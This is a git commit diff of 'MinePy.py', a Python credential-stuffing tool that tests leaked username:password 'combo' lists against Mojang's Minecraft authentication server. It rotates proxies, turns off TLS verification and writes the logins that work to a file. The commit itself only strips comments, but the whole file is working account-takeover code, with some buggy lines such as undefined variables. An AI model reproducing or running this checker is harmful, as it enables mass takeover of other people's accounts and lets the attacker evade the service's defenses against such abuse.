04229a8f696bdb1e75d6230cae66dcf88fd03bea
Miyako Yakota <50219605+MiyakoYakota@users.noreply.github.com>
2020-09-29 14:42:54 -0400

    remove comments that make this app sound like it was made by a 6 year old learning python
    if you can't read it why are you using it lol

--- MinePy.py
+++ MinePy.py
@@ -1,13 +1,15 @@
-import csv # For processing combos and proxies
-import requests # For making web requests
-import random # For choosing proxies at random
+import requests
+import random
 from multiprocessing import Pool # Multi-Threading
 from multiprocessing import freeze_support # Windows Support
 
+accounts = [line.rstrip('\n') for line in open("combo.txt", 'r')]
+proxies = [line.rstrip('\n') for line in open("proxies.txt", 'r')]
 
-working = [] # Initialize the working accounts list
+requests.packages.urllib3.disable_warnings()
 
-headers = { # Set HTTP Headers
+working = []
+headers = {
     'Host': 'authserver.mojang.com',
     'Connection': 'close',
     'Accept': 'application/json, text/plain, */*',
@@ -18,22 +20,17 @@ headers = { # Set HTTP Headers
     'Accept-Language': 'en-US,en;q=0.8',
 }
 
-requests.packages.urllib3.disable_warnings() # Disable annoying HTTPS Warnings, not really needed for this application.
-
-
-accounts = [line.rstrip('\n') for line in open("combo.txt", 'r')]
-proxies = [line.rstrip('\n') for line in open("proxies.txt", 'r')]
 
 def checkAccount(accountNumber):
     global working
-    proxyNumber = random.randint(0,len(proxies)) # Get a random proxy from the proxy list
-    data = '{"agent":{"name":"Minecraft","version":1},"username":"' + accounts[accountNumber].split(':')[0] +'","password":"' + accounts[accountNumber].split(':')[1] + '"}' # Set the data that will be sent to the auth servers to check
-    response = requests.post('https://authserver.mojang.com/authenticate', proxies={"https": "http://" + proxies[proxyNumber]}, headers=headers, data=data, verify=False) # Send the data and assign the response to the variable response
-    if ("accessToken" in response.text): # Check if the account is working.
+    proxyNumber = random.randint(0,len(proxies))
+    data = '{"agent":{"name":"Minecraft","version":1},"username":"' + accounts[accountNumber].split(':')[0] +'","password":"' + accounts[accountNumber].split(':')[1] + '"}'
+    response = requests.post('https://authserver.mojang.com/authenticate', proxies={"https": "http://" + proxies[proxyNumber]}, headers=headers, data=data, verify=False) 
+    if ("accessToken" in response.text):
           working.append(accounts[accountNumber].split(':')[0]+":"+password[accountNumber].split(':')[1])
           print(working)
-          with open('working.txt', 'a') as f: # Open working .txt
-                f.write("%s\n" % item) # Write account
+          with open('working.txt', 'a') as f:
+                f.write("%s\n" % item)
     
 def main():
     numThreads = input("How many threads would you like to use? ")
